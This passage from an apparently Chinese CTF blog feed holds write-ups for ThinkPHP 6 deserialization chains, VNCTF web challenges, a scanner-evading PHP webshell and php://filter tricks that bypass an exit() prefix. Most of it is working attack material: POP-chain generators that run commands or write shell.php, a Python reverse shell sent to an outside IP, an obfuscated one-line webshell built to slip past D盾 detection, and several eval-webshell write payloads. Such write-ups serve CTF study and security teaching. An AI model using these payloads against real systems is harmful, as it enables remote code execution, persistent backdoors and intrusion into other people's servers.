class="keyword">$this</span>-&gt;field = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;schema = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$obj=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::__construct();        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obj;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure>



<p>最后自己写的~</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">protected</span> $json = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $lazySave =<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">private</span> $exists = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">protected</span> $visible = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $relation = [<span class="string">&quot;foo&quot;</span>=&gt;<span class="string">&quot;12qw3&quot;</span>];</span><br><span class="line">        <span class="keyword">private</span> $data = [<span class="string">&#x27;foo&#x27;</span> =&gt;[<span class="string">&quot;ysllz&quot;</span>=&gt;<span class="string">&quot;dir&quot;</span>]];  <span class="comment">//最终要执行的命令，ysllz 这里要保持一致。</span></span><br><span class="line">        <span class="keyword">private</span> $table;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">&quot;foo&quot;</span>=&gt;[<span class="string">&quot;ysllz&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>]];</span><br><span class="line">        <span class="keyword">protected</span> $jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a= <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;table =$a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    $pivot1 =  <span class="keyword">new</span> Pivot();</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> Pivot($pivot1);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>后面在过客师傅这里又找到两个POP链，感觉很牛赶紧复现了</p>
<h1 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h1><p>这是一个文件写入的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>&#123;</span><br><span class="line">    <span class="title">interface</span> <span class="title">CacheInterface</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span> <span class="keyword">implements</span> <span class="title">CacheInterface</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $autosave = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $complete=<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>; <span class="comment">//注意这里有jsonencode,但是不影响</span></span><br><span class="line">        <span class="keyword">protected</span> $adapter;</span><br><span class="line">        <span class="keyword">protected</span> $file = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter = $a;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Local</span> <span class="title">extends</span> <span class="title">AbstractAdapter</span>&#123;</span><br><span class="line">        protected $pathPrefix =&#x27;&#x27;;</span><br><span class="line">        <span class="keyword">protected</span> $writeFlags =<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">Local</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line">    $loc = <span class="keyword">new</span> Local();</span><br><span class="line">    $ada = <span class="keyword">new</span> Adapter($loc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($ada));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>啊感觉还是学到了新姿势，首先可以通过找字类实现了接口，所以不要看到有的抽象类的save无法使用就放弃了，其实也可以的。</p>
<p>入口在AbstractCache的destruct下面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line"><span class="comment">//        var_dump($this-&gt;autosave);</span></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>然后发现save没法过去，故找一个字类继承了父类的，找到</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200009828.png" alt="image-20210506200009828"></p>
<p>看到save</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200032209.png" alt="image-20210506200032209"></p>
<p>一开始我以为是write，所以全局搜索write，找到子类Local</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200225344.png" alt="image-20210506200225344"></p>
<p>重点就是这个file_put_contents,然后我们发现这三个参数都可以控制= =，但是面临一个问题。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;adapter-&gt;has(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;adapter-&gt;update(<span class="keyword">$this</span>-&gt;file, $contents, $config);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>

<p>因为会有$this-&gt;file，如果我们赋值的话就不会进入了，然而然而，我又在当前类找了找update方法，出乎意料的</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200400314.png" alt="image-20210506200400314"></p>
<p>欸，也能写入，所以直接写进就好了，构造exp出来就有了。</p>
<p>结果：</p>
<p><img src="thinkphp6.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20210506200513501.png" alt="image-20210506200513501"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>vnctf</title>
    <url>/2021/03/23/vnctf/</url>
    <content><![CDATA[<p>VNCTF 的刷题记录</p>
<h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>一个CVE的复原CVE-2020-7245，没有什么好说的</p>
<h1 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h1><p>这个题目算比较简单嘞，</p>
<p>题目给出源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看见shell的part去执行命令了。直接反弹shell</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">shell?c=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;81.69.201.65&#x27;,8002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>

<p>这里有一个trick，就是当Python处理文件的时候，若仅仅是open却没有close流的话，还是可以通过proc下读取的，所以我们再次执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;*</span><br></pre></td></tr></table></figure>

<p>即可。</p>
<h1 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h1><p>学到了..深感自己对于HTTP和NC的了解不足</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始看见有个任意文件读取我就在那猛读，结果啥也没有，后来才知道是GuzzleHttp的漏洞，文章出处：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.laruence.com&#x2F;2016&#x2F;07&#x2F;19&#x2F;3101.html</span><br></pre></td></tr></table></figure>

<p>在文章当中我们就可以看见作者说到：</p>
<p>所以， 这个漏洞要影响你， 有几个核心前提是:</p>
<ul>
<li>你的服务会对外请求资源</li>
<li>你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）</li>
<li>你的服务跑在PHP的CGI模式下(cgi, php-fpm)</li>
</ul>
<p>那么先看phpinfo，确实运行才CGI模式下，之后再看环境代理，作者清楚的写出了http_proxy的Guzzle有缺陷，所以我们可以利用文章中作者给出的姿势：</p>
<p><img src="image-20210323201359448.png" alt="image-20210323201359448"></p>
<p>我们利用nc就可以操作到，先监听，之后伪造一个访问的信息即可</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: Keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="image-20210323201426824.png" alt="image-20210323201426824"></p>
]]></content>
  </entry>
  <entry>
    <title>一些过狗马</title>
    <url>/2020/12/14/%E4%B8%80%E4%BA%9B%E8%BF%87%E7%8B%97%E9%A9%AC/</url>
    <content><![CDATA[<p>写这篇的原因主要是一次对内的AWD自己被一个过狗马的方式卡住了，想了半天才折腾出来，所以打算总结一下各种过狗马的姿势。</p>
<p>在各篇AWD比赛中总会教我们起手式就是把原件脱下来备份，之后就是用D盾扫。而D盾这个东西对于代码的识别很多时候也就是局限于对一些函数的正则匹配。所以我们绕过需要注意几点即可：</p>
<ul>
<li>对于eval，call_back函数是不能用的</li>
<li>尝试使用一些罕见的call back函数</li>
</ul>
<p>记录一个傻逼玩意儿：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__=$_.$_;$_=($_==$__);$__=($_==$_);$___=~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__];$____=~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__];$___($$____[_]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码是_</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>全国工控2020-web-easyphp</title>
    <url>/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/</url>
    <content><![CDATA[<h1 id="全国工控2020-web-easyphp"><a href="#全国工控2020-web-easyphp" class="headerlink" title="全国工控2020-web-easyphp"></a>全国工控2020-web-easyphp</h1><h2 id="1-从伪协议开始说起"><a href="#1-从伪协议开始说起" class="headerlink" title="1.从伪协议开始说起"></a>1.从伪协议开始说起</h2><p>php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流，</p>
<p>在之前三个白帽中有一个比赛，其中一部分的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>

<h3 id="1-base64"><a href="#1-base64" class="headerlink" title="1.base64"></a>1.base64</h3><p>在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。</p>
<p>但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去，</p>
<p>当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为：</p>
<p>phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用：</p>
<p>官网：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器</span><br></pre></td></tr></table></figure>

<h3 id="2-rot13"><a href="#2-rot13" class="headerlink" title="2.rot13"></a>2.rot13</h3><p>除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php&amp;txt=<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到php为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc rkvg; <span class="meta">?&gt;</span><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">txt=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>&amp;filename=php:<span class="comment">//filter/write=string.rot13/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p>成功！除此之外，还补充一种骚思路：</p>
<h3 id="3-iconv字符编码转换"><a href="#3-iconv字符编码转换" class="headerlink" title="3.iconv字符编码转换"></a>3.iconv字符编码转换</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4-</span></span><br></pre></td></tr></table></figure>

<p>根据大佬给出的UCS2-2 编码的方式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可，</p>
<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>写入shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>4.组合使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>还可以尝试使用srtip_tags+base64的方式进行绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。</p>
<p>讲完上面的，再回到wmctf的check in2，题目的源码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>除此之外，还有二次编码绕过的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p> 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化逃逸</title>
    <url>/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>也算是多做做总结吧</p>
<h1 id="变长"><a href="#变长" class="headerlink" title="变长"></a>变长</h1><p>从网上看来的那么一段代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$AA=<span class="keyword">new</span> A();</span><br><span class="line">$res=filter(serialize($AA));</span><br><span class="line"><span class="keyword">echo</span> 